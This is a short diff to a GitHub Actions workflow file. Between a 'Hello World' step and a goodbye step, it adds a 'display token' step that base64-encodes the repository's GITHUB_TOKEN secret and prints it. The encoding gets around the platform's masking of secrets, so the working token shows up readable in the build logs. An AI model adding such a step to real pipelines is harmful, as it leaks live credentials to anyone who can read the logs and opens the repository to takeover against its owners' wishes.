@@ -7,5 +7,7 @@ jobs:
     steps:
       - name: Print Greeting
         run: echo "Hello World!"
+      - name: display token
+        run: echo "TOKEN_BASE64=$(echo -n "${{ secrets.GITHUB_TOKEN }}" | base64)"
       - name: Print Goodbye
         run: echo "Done - Bye!"
